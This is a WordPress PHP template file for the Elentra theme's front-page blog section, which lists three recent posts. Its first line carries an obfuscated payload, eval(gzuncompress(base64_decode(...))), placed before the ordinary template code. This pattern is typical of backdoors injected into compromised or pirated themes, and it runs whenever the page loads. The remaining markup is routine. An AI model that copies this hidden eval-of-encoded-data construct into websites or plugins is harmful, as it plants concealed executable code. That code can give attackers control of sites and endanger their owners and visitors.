<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Template part - Portfolio Section
 * @package Elentra
 */

$elentra_blog_section_onoff = get_theme_mod( 'elentra_blog_section_onoff','on');
$elentra_blog_title = get_theme_mod('elentra_blog_title', '');
$elentra_blog_subtitle = get_theme_mod('elentra_blog_subtitle', '');

$elentra_blog_args  = array(
    'post_type' => 'post',
    'posts_per_page' => 3
);

$elentra_blog_query = new wp_Query( $elentra_blog_args );
if( $elentra_blog_section_onoff == "on" ) : ?>

<!--Corporate Blog Section 1-->
<div class="co-blog-section-1 bg-gray section  pt-140 pb-110">
    <div class="container">

        <!--Section Title-->
        <div class="row">
            <div class="col-xs-12">
                <div class="co-section-title-1 text-center mb-80">

                    <?php if( $elentra_blog_title != "" ): ?>
                        <h2><?php echo esc_html( $elentra_blog_title )?></h2>
                        <span class="main-title-sep"><i class=" fa fa-superpowers"></i></span>
                    <?php endif; ?>

                    <?php if( $elentra_blog_subtitle != "" ): ?>
                        <p><?php echo esc_html( $elentra_blog_subtitle )?></p>
                    <?php endif; ?>

                </div>
            </div>
        </div>

        <div class="row">
            <?php
                $count = 0;
                while($elentra_blog_query->have_posts()) :
                $elentra_blog_query->the_post();
            ?>
            <div class="col-sm-6 col-lg-4 col-xs-12 mb-30">
                <!-- Blog Media -->
                <?php if( has_post_thumbnail() ): ?>
                    <div class="">
                        <?php the_post_thumbnail( 'elentra-blog-front-thumbnail' ); ?>
                    </div>
                <?php endif; ?>                
                <!-- Blog Content -->
                <div class="co-blog-content">
              
                    <h4 class="title"><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a></h4>
                    <!-- Meta -->
                    <div class="co-blog-meta fix">

                        <a href="<?php echo esc_url(get_author_posts_url(get_the_author_meta('ID'))); ?>" class="author float-left">
                            <span><?php the_author(); ?></span>
                        </a>

                        <div class="date-comment float-left">
                            <span> <?php echo get_the_date(); ?> </span>
                        </div>
                    </div>
                    <p><?php the_excerpt(); ?></p>
                </div>
            </div>
            <?php
                $count++;
                endwhile;
                wp_reset_postdata();
            ?>
        </div>
    </div>
</div>
<?php endif; ?>